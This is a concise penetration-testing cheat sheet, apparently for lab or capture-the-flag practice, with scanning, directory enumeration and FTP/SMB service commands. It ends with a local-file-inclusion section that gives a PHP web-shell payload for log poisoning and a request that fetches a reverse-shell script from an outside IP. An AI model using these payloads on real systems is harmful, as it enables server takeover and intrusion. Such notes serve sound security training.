# Pentesting (Concise Notes)

|No.|Steps|
|---|---|
|1|Scanning|
|2|Enumeration|
|3|Services|
|4|Exploitation|
|5|Post-Exploitation|


## Scanning

|No.|Tool|Command|
|---|---|---|
|1|Threader3000|`threader3000 10.11.67.208`|
|2|Autorecon|`autorecon 10.11.67.208`|
|3|Nmap| `nmap -sn 192.168.102.0/24 -T4 -oN discovery.nmap`<br>`nmap -iL output.txt -T4 -sV -sC -p- -Pn -n --open -A -oN version.nmap`<br>`nmap script=vuln 192.168.193.211`

## Enumeration

|No.|Tool|Command|
|---|---|---|
|1|Gobuster| `gobuster dir -u <target site> -w  /usr/share/seclists/Discovery/Web-content/directory-list-lowercase-2.3-big.txt -t 200 -q` <br> `gobuster dir -x php,txt -u 172.27.65.31 -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 200 -q` (To find php files as well as folders)|
|2|Dirsearch| `dirsearch -u 10.10.255.124 -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `<br> `dirsearch -u 172.16.64.140/project --auth-type=basic --auth=YWRtaW46YWRtaW4= -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` (If page needs to login)
|3|Wpscan| `wpscan --url somewebsite.com --enumerate u,ap,at,cb,dbe`|

## Services

|Ports|Services|Tool|Command|
|---|---|---|---|
|21|FTP|nmap <br> ftp (anonymous login) <br> ftp (download all files)|`nmap --script ftp-* -p 21 10.11.67.208` <br> anonymous:anonymous, anonymous:, ftp:ftp <br> `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98`|
|139, 445|SMB|smbclient (List shares) <br> smbclient (Connect to shares) <br> enum4linux <br> nmap|`smbclient -L //10.130.40.80 -N` <br> `smbclient  //10.10.215.173/milesdyson -U=milesdyson` <br> `enum4linux -a 10.11.67.208` <br> `nmap -script=smb-enum-share`|

## Exploitation

|Vulnerability|Signs|Method|Command|
|---|---|---|--|
|Local File Inclusion|files being included in GET parameter| 1. Try to view the server file (view the blacklist) <br> 2. Log poisoning| `/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`<br> <br> <br> <br> <br> User-Agent: `<?php system($_GET['cmd']); ?>` <br> `/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http%3a//10.11.67.208%3a8023/php-reverse-shell.php` 
 

